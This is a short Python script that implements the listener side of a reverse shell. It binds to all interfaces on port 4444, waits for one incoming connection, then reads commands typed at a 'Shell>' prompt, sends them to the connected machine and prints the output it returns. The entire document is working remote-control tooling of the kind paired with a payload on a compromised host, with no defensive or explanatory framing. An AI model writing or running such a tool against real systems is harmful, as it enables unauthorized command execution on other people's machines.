import socket

# Create server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 4444))  # Bind to all network interfaces on port 4444
server_socket.listen(1)

print("[*] Waiting for a connection...")
client_socket, client_address = server_socket.accept()
print(f"[+] Connection from {client_address}")

while True:
    command = input("Shell> ")

    if command.lower() == "exit":
        client_socket.send(b"exit")
        client_socket.close()
        break

    if command.strip() == "":
        continue  # Skip if empty command

    client_socket.send(command.encode())

    output = client_socket.recv(4096)  # Receive command output
    print(output.decode('utf-8', errors='ignore'))  # Print output safely
